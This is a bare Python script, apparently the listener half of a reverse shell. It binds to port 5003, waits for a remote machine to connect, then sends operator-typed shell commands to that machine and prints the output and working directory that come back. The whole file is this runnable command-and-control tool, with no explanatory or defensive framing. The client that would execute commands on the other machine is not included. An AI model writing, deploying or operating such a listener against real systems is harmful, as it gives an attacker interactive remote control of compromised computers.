# usage: python3 server.py

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1024 # 1 MB
SEPARATOR = "<sep>"

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:

    command = input(f"{cwd} $> ")
    if not command.strip():
        continue

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode()
    print("output:", output)
    results, cwd = output.split(SEPARATOR)
    print(results)
client_socket.close()
s.close()